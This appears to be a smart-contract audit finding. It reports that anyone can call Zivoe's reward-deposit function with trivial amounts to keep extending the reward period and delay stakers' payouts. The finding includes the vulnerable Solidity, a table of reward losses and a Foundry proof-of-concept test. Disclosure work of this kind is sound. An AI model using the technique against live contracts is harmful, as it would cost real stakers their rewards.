# [M-#] Griefing attack possible in `ZivoeRewards::depositRewards()` by continuously extending `periodFinish`

## Summary

Lack of checks on who can call and how much value


## Vulnerability Detail

Any address can call `ZivoeRewards::depositRewards()` with any amount of `_rewardsToken`. Each time this function is called, `rewardData[_rewardsToken].periodFinish` is set to `block.timestamp` + `rewardData[_rewardsToken].rewardsDuration`, and a new `rewardData[_rewardsToken].rewardRate` is calculated.
If `ZivoeRewards::depositRewards()` is called before the previous `rewardData[_rewardsToken].periodFinish` has passed for some `_rewardsToken`, then the previously allocated rewards will be distributed slower than intended (evenly over a full new `rewardsDuration`).

https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-foundry/src/ZivoeRewards.sol#L225-L243

```javascript
    /// @notice Deposits a reward to this contract for distribution.
    /// @param _rewardsToken The asset that's being distributed.
    /// @param reward The amount of the _rewardsToken to deposit.
    function depositReward(address _rewardsToken, uint256 reward) external updateReward(address(0)) nonReentrant {
        IERC20(_rewardsToken).safeTransferFrom(_msgSender(), address(this), reward);

        // Update vesting accounting for reward (if existing rewards being distributed, increase proportionally).
        if (block.timestamp >= rewardData[_rewardsToken].periodFinish) {
            rewardData[_rewardsToken].rewardRate = reward.div(rewardData[_rewardsToken].rewardsDuration);
        } else {
            uint256 remaining = rewardData[_rewardsToken].periodFinish.sub(block.timestamp);
            uint256 leftover = remaining.mul(rewardData[_rewardsToken].rewardRate);
@>          rewardData[_rewardsToken].rewardRate = reward.add(leftover).div(rewardData[_rewardsToken].rewardsDuration); // new rewardRate calculated
        }

        rewardData[_rewardsToken].lastUpdateTime = block.timestamp;
@>      rewardData[_rewardsToken].periodFinish = block.timestamp.add(rewardData[_rewardsToken].rewardsDuration); // periodFinish extended each time this function is called
        emit RewardDeposited(_rewardsToken, reward, _msgSender());
    }


```

This allows griefing attacks where users can maliciously call `ZivoeRewards::depositRewards()` for any `_rewardsToken` any number of times, on any instance of this contract (`stSTT`, `stJTT`, `stZVE`, or `vestZVE`) to perpetually delay users' staking rewards.

Also note that delayed staking rewards will likely happen accidently with any user able to call `OCE_ZVE::forwardEmissions()` which subsequently makes calls to `ZivoeRewards::depositRewards()` with `ZVE` as the `_rewardsToken`.

## Impact

The table below shows the percentage of staking rewards a user will be able to claim after the full `rewardsDuration` has elapsed with a malicious user repeatedly calling `ZivoeRewards::depositRewards()`. 

Note this was modelled for simplicitly, but malicious calls to `ZivoeRewards::depositRewards()` do not need to be at consistent intervals.

| Malicious Calls to depositRewards()     | Staker Rewards as a % of their expected rewards |
|-----------------------------------------|-------------|
| None                       | 99.99%      |
| extra deposit after 15 days             | 74.99%      |
| 2 extra deposits, each after 10 days    | 70.37%      |
| 5 extra deposits, each after 6 days     | 67.23%      |
| deposit every single day                | 63.83%      |
| deposit every single hour               | 63.23%      |
| deposit every single minute             | 63.21%      |


## Code Snippet

POC - Paste this test into `Test_ZivoeRewards.sol`. The test shows a single extra call to `ZivoeRewards::depositRewards()` resulting in a staker being only able to claim 75% of their expected rewards after the full `rewardsDuration` has elapsed.

```javascript
    function test_Audit_ExtraDeposit_Scenario1() public {
        uint256 stakeAmount = 1000e18;
        uint256 rewardAmount = 100e18;
        uint256 startTs = block.timestamp;

        // 1. Jim stakes their 1k tokens
        assert(jim.try_approveToken(address(ZVE), address(stZVE), stakeAmount));
        jim.try_stake(address(stZVE), stakeAmount);

        // 2. Bob deposits DAI into stZVE, triggering a 30 day unlock period for stakers
        depositReward_DAI(address(stZVE), rewardAmount);

        // 3. Extra deposit(s) occur
        hevm.warp(block.timestamp + 15 * 86400);
        depositReward_DAI(address(stZVE), 1);
        hevm.warp(block.timestamp + 15 * 86400);
        
        // 4. 30 days has passed since initial reward was allocated, Jim calls getRewards()
        assert(block.timestamp == startTs + 30 * 86400);
        uint256 jimPreClaimBalance = IERC20(DAI).balanceOf(address(jim));
        assert(jim.try_getRewards(address(stZVE)));
        uint256 jimPostClaimBalance = IERC20(DAI).balanceOf(address(jim));
        assert(jimPostClaimBalance - jimPreClaimBalance < rewardAmount); // Jim would reasonably expect to claim close to 100e18 being the only staker, but can only claim ~ 75e18 due to the periodFinish being extended. 
        //console2.log("Percent claim: ", BIPS * (jimPostClaimBalance - jimPreClaimBalance) / rewardAmount);
    }
```

## Tool used

Manual Review

## Recommendation

Some mitigigations are:
1. Increase cost the the attack by asserting `ZivoeRewards::depositRewards()` must be called with a minimum `amount` of `rewardData[_rewardsToken].rewardsDuration`. After all when `amount` < `rewardData[_rewardsToken].rewardsDuration`, then `rewardData[_rewardsToken].rewardRate` truncates to 0 anyway, so no rewards are unlocked by stakers.
2. Access controls on who can call `ZivoeRewards::depositRewards()`, limit access to key yield distributing contracts such as `ZivoeYDL` and `OCE_ZVE`.
